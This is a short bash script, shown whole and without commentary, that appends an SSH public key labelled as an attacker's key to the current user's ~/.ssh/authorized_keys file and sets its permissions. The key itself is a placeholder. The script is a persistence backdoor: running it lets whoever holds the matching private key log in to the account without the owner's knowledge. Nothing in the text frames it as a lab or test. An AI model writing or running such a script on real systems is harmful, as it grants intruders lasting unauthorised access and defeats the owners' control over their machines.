#!/bin/bash
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC-attacker-key' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
